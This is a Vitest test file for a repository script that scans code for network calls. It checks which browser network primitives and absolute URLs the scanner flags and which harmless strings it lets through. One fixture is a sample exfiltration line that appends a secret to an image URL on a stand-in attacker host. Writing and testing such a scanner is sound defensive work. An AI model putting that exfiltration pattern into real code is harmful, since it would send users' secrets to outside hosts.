import { describe, expect, it } from "vitest";
// @ts-expect-error -- a plain .mjs script with no types, imported on purpose: testing a
// copy of its patterns would test the copy.
import { scan } from "../../scripts/check-no-network.mjs";

type Hit = { file: string; what: string; where: string; excerpt: string };
const what = (text: string): string[] => (scan(text, "t") as Hit[]).map((h) => h.what);

/**
 * The scanner is the layer a stranger can run without trusting this repo, so it has to
 * actually catch things. A grep that finds nothing is not evidence until you have watched
 * it find something.
 */
describe("what it catches", () => {
  it("catches every network primitive it claims to", () => {
    const cases: [string, string][] = [
      ["await fetch(url)", "fetch("],
      ["new XMLHttpRequest()", "XMLHttpRequest"],
      ["new WebSocket(u)", "WebSocket"],
      ["new EventSource(u)", "EventSource"],
      ["navigator.sendBeacon(u, d)", "navigator.sendBeacon"],
      ["const i = new Image(); i.src = u", "new Image"],
      ["importScripts(u)", "importScripts("],
      ["navigator.clipboard.readText()", "navigator.clipboard"],
    ];
    for (const [source, expected] of cases) {
      expect(what(source), source).toContain(expected);
    }
  });

  it("catches an absolute URL, which is how data leaves without an obvious API", () => {
    expect(what('img.src = "https://evil.example/?d=" + secret')[0]).toContain("https://evil.example");
  });

  it("catches a URL in a string that is never called, because reachability is not the test", () => {
    expect(what('const ENDPOINT = "https://telemetry.example/collect";').length).toBe(1);
  });

  it("reports a line and column, so a hit can be looked at rather than only counted", () => {
    const hits = scan("ok\nok\nawait fetch(x)", "t") as Hit[];
    expect(hits[0]?.where).toBe("3:7");
  });
});

describe("what it lets through", () => {
  it("passes clean code", () => {
    expect(what("const x = atob(s); JSON.parse(x);")).toEqual([]);
  });

  it("passes the SVG namespace, which is an identifier and not an address", () => {
    expect(what('xmlns="http://www.w3.org/2000/svg"')).toEqual([]);
  });

  it("does not fire on a word that merely contains a primitive's name", () => {
    // `prefetching` and `refetch` are not `fetch(`, and a check that cried wolf on them
    // would get its patterns widened until it stopped catching anything.
    expect(what("const prefetching = true; function refetchLater() {}")).toEqual([]);
    expect(what("const myWebSocketish = 1")).toEqual([]);
  });

  it("does not fire on a relative URL", () => {
    expect(what('src = "./fonts/archivo-latin.woff2"')).toEqual([]);
  });
});
